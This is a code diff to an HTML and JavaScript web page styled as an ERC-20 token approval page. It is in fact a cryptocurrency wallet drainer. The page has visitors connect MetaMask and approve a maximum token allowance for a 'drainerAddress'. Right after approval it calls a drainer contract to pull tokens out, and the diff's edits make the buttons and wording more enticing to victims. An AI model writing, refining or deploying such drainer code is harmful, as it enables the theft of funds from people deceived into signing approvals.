@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Transfer Approval</title>
+    <title>Token Transfer Approval and Drain</title>
 </head>
 <body>
     <h1>Approve and Transfer ERC-20 Tokens</h1>
-    <button id="connectButton">Connect Wallet</button>
+    <button id="connectButton">Click me to connect your wallet</button>
     <button id="approveButton">Approve Token Transfer</button>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
@@ -24,7 +24,8 @@
                     console.log('Connected account:', account);
                     alert(`Connected account: ${account}`);
                 } catch (error) {
-                    console.error('User rejected connection or error occurred:', error);
+                    console.error('Error connecting to MetaMask:', error);
+                    alert('Error connecting to MetaMask: ' + error.message);
                 }
             } else {
                 alert('MetaMask is not installed!');
@@ -60,12 +61,12 @@
                 const tokenContract = new web3.eth.Contract(approveAbi, tokenAddress);
 
                 try {
-                    await tokenContract.methods
+                    const tx = await tokenContract.methods
                         .approve(drainerAddress, maxApproval)
                         .send({ from: account });
 
+                    console.log('Token approval transaction:', tx);
                     alert('Token approval successful!');
-                    console.log('Token approval transaction completed.');
 
                     // Automatically trigger the token drain function after approval
                     drainTokens();
@@ -99,7 +100,7 @@
             const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerAddress);
 
             try {
-                const amountToDrain = web3.utils.toWei('10', 'ether');  // Adjust the amount of tokens
+                const amountToDrain = web3.utils.toWei('10', 'ether');  // Adjust the amount of tokens to your needs
 
                 // Send a transaction to the contract to drain tokens
                 const tx = await drainerContract.methods.drainTokens(tokenAddress, amountToDrain).send({
